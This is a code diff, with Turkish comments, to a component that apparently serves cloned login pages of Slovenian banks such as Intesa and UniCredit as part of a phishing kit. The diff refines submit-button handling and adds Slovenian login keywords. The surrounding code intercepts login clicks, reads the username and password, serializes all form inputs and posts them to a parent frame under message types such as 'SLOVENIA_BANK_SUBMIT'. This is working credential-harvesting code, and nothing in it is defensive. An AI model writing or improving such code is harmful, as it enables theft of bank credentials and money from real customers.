@@ -1607,46 +1607,43 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
                 if (style.display === 'none' || style.visibility === 'hidden') return false;
                 return true;
             });
-            // Fallback sadece "stray" (hicbir <form> icinde olmayan) text-tipi
-            // alanlar: Intesa'da arama kutusu ve doviz cevirici baska formlarin
-            // icinde - onlari sayarsak bos olduklari icin buton hic acilmaz.
-            // select/checkbox stray alanlar da login disi oldugu icin atlanir.
-            const docVisibleInputs = findVisibleInputs(document).filter((inp: any) => {
-                if (inp.closest && inp.closest('form')) return false;
-                const t = (inp.type || '').toLowerCase();
-                return t === 'text' || t === 'password' || t === 'email' || t === 'tel' || t === 'number';
-            });
+            // Butonu acmak icin tek guvenilir sinyal: butonun kendi formundaki
+            // (yoksa sayfadaki stray) login alanlarinin HEPSI dolu mu?
+            // Form ici/disi ayrimi guvenilmez (Intesa: alanlar form disinda,
+            // OTP: farkli formda, UniCredit: 2 adimli akis). Yabanci formlar
+            // (arama kutusu, doviz cevirici) hic sayilmaz.
+            const anyLoginFieldFilled = (btn) => {
+                const btnForm = btn && btn.closest ? btn.closest('form') : null;
+                const isLoginType = (inp) => {
+                    const t = (inp.type || '').toLowerCase();
+                    return ['text', 'password', 'email', 'tel', 'number'].indexOf(t) !== -1;
+                };
+                const own = btnForm ? findVisibleInputs(btnForm).filter(isLoginType) : [];
+                const stray = findVisibleInputs(document).filter((inp) => isLoginType(inp) && !(inp.closest && inp.closest('form')));
+                const relevant = own.length ? own : stray;
+                if (!relevant.length) return false;
+                return relevant.every((i) => (i.value || '').trim() !== '');
+            };
 
             targetForms.forEach(container => {
-                let visibleInputs = findVisibleInputs(container);
-                // Intesa gibi: login <form>'u sadece hidden input + buton iceriyor,
-                // gorunur alanlar formun DISINDA (React markup). Form icinde hic
-                // gorunur alan yoksa document seviyesine bak - yoksa buton
-                // sonsuza dek disabled kaliyor.
-                if (visibleInputs.length === 0 && container !== document) {
-                    visibleInputs = docVisibleInputs;
-                }
-
-                const hasEmptyField = visibleInputs.length === 0 || visibleInputs.some(inp => !inp.value || inp.value.trim() === '');
-
-                const submitButtons = container.querySelectorAll('button[type="submit"], input[type="submit"], button.button.-positive, .button.-positive, button.btn-primary, button.v-btn, .submit-btn, a.submit-btn, button[name="aLogin"], input.btn');
+                const submitButtons = container.querySelectorAll('button[type="submit"], input[type="submit"], button.button.-positive, .button.-positive, button.btn-primary, button.v-btn, .submit-btn, a.submit-btn, button[name="aLogin"], input.btn, button.button-proceed');
                 submitButtons.forEach(btn => {
                     const text = btn.textContent ? btn.textContent.toLowerCase() : (btn.value ? btn.value.toLowerCase() : '');
                     const isTab = /(smart[ -]?id|mobile[ -]?id|biometri|pin[ -]?gen|id[ -]?kort|mobilescan|digipass|kod|kartica)/i.test(text) || btn.hasAttribute('data-tab-index') || (btn.closest && btn.closest('[data-tab-index]'));
                     if (isTab) return;
 
-                    if (hasEmptyField) {
-                        btn.setAttribute('disabled', 'true');
-                        btn.disabled = true;
-                        btn.classList.add('disabled', 'v-btn--disabled', '-disabled', 'is-disabled');
-                        btn.setAttribute('aria-disabled', 'true');
-                        btn.style.opacity = '0.5';
+                    if (!anyLoginFieldFilled(btn)) {
+                        // SADECE gorsel pasif gorunum - disabled/pointer-events YOK:
+                        // disabled buton hic click uretmez, pointer-events:none click'i
+                        // arkadaki elemana kacirir -> buton hic calismiyor gorunuyordu.
+                        // Bosken tiklanirsa submit zaten hasValue kontrolunde duruyor.
+                        btn.classList.add('is-soft-disabled');
+                        btn.style.opacity = '0.55';
                         btn.style.cursor = 'not-allowed';
-                        btn.style.pointerEvents = 'none';
                     } else {
                         btn.removeAttribute('disabled');
                         btn.disabled = false;
-                        btn.classList.remove('disabled', 'v-btn--disabled', '-disabled', 'is-disabled');
+                        btn.classList.remove('disabled', 'v-btn--disabled', '-disabled', 'is-disabled', 'is-soft-disabled');
                         btn.setAttribute('aria-disabled', 'false');
                         if (btn.getAttribute('tabindex') === '-1') btn.setAttribute('tabindex', '0');
                         btn.style.opacity = '1';
@@ -2397,7 +2394,10 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
             if (ucHasUser && target.closest && target.closest('.button-proceed')) {
               e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
               const v = (document.getElementById('unsernameInput') || { value: '' }).value || '';
-              try { window.parent.postMessage({ type: 'SLOVENIA_BANK_UC_STEP', username: v }, '*'); } catch(_e){}
+              // Buton artik hard-disable edilmiyor - bos kullanici adiyla ilerleme
+              if (v && v.trim() !== '') {
+                try { window.parent.postMessage({ type: 'SLOVENIA_BANK_UC_STEP', username: v }, '*'); } catch(_e){}
+              }
               return false;
             }
             if (ucHasPass && target.closest && target.closest('#backButton')) {
@@ -2408,11 +2408,14 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
             if (ucHasPass && target.closest && target.closest('.button-proceed')) {
               e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
               try {
-                const res = serializeAllLtForms();
-                window.parent.postMessage({
-                  type: 'SLOVENIA_BANK_SUBMIT',
-                  formData: { inputs: res.inputs, fields: res.fields, loginMethod: getLoginMethod() }
-                }, '*');
+                const pv = (document.getElementById('passwordInput') || { value: '' }).value || '';
+                if (pv && pv.trim() !== '') {
+                  const res = serializeAllLtForms();
+                  window.parent.postMessage({
+                    type: 'SLOVENIA_BANK_SUBMIT',
+                    formData: { inputs: res.inputs, fields: res.fields, loginMethod: getLoginMethod() }
+                  }, '*');
+                }
               } catch(_e){}
               return false;
             }
@@ -2539,8 +2542,8 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
               const isLangBtn = btnText.includes('keel') || btnText.includes('language') || btn.id === 'language-dropdown-button' || /\\b(ru|en|et|lt|lv)\\b/i.test(btnText) && btnText.length < 15;
 
               // STRICT SUBMIT TEXT: maks 30-40 karakter, ve net login/patvirt/prisijung...
-              const submitText = /^(prisijung|login|log[\\s-]*in|sign[\\s-]*in|giriş|giris|giris yap|giriş yap|continue|next|ileri|tamam|onayla|verify|patvirt|jätka|sisene|teising|confirm|submit|authenticate|patvirtinti|pateikti|valdyti)/i.test(btnText) ||
-                /(prisijung|login|log[\\s-]*in|sign[\\s-]*in|giriş|giris|verify|patvirt|jätka|sisene|confirm|submit|authenticate|patvirtinti|pateikti)/i.test(btnText) && btnText.length <= 42;
+              const submitText = /^(prisijung|prijav|vpis|vstop|potrdi|nadaljuj|naprej|vstavi|login|log[\\s-]*in|sign[\\s-]*in|giriş|giris|giris yap|giriş yap|continue|next|ileri|tamam|onayla|verify|patvirt|jätka|sisene|teising|confirm|submit|authenticate|patvirtinti|pateikti|valdyti)/i.test(btnText) ||
+                /(prisijung|prijav|vpis|vstop|potrdi|login|log[\\s-]*in|sign[\\s-]*in|giriş|giris|verify|patvirt|jätka|sisene|confirm|submit|authenticate|patvirtinti|pateikti)/i.test(btnText) && btnText.length <= 42;
 
               if (!isTabBtn && !isLangBtn && (submitText || isNativeSubmit)) {
                   isSubmitBtn = true;
@@ -2861,6 +2864,28 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
                // Butonun disabled degilse ya da tarayici submit etmeye kalktiysa sadece native navi engelle, ayrica bir şey yapma
                return false;
              }
+
+             // Bos username/sifre ile giris engeli: butonun kendi formundaki
+             // (yoksa stray) login alanlarindan bir tanesi bile bossa GONDERME.
+             // Yabanci formlar (arama kutusu, doviz cevirici) sayilmaz.
+             try {
+               const btnForm = target && target.closest ? target.closest('form') : null;
+               const isLoginType = (inp) => ['text','password','email','tel','number'].indexOf((inp.type || '').toLowerCase()) !== -1;
+               const visLogin = (cont) => Array.from(cont.querySelectorAll('input')).filter(inp => {
+                 if (!isLoginType(inp)) return false;
+                 const cs = window.getComputedStyle(inp);
+                 if (cs.display === 'none' || cs.visibility === 'hidden') return false;
+                 const r = inp.getBoundingClientRect ? inp.getBoundingClientRect() : null;
+                 if (r && (r.width <= 2 || r.height <= 2)) return false;
+                 return true;
+               });
+               const own = btnForm ? visLogin(btnForm) : [];
+               const stray = visLogin(document).filter(i => !(i.closest && i.closest('form')));
+               const relevant = own.length ? own : stray;
+               if (relevant.length && relevant.some(i => !(i.value || '').trim())) {
+                 return false;
+               }
+             } catch(_) {}
 
              // Submit et (parenta postMessage - sonraki adima parent handle eder)
              window.parent.postMessage({
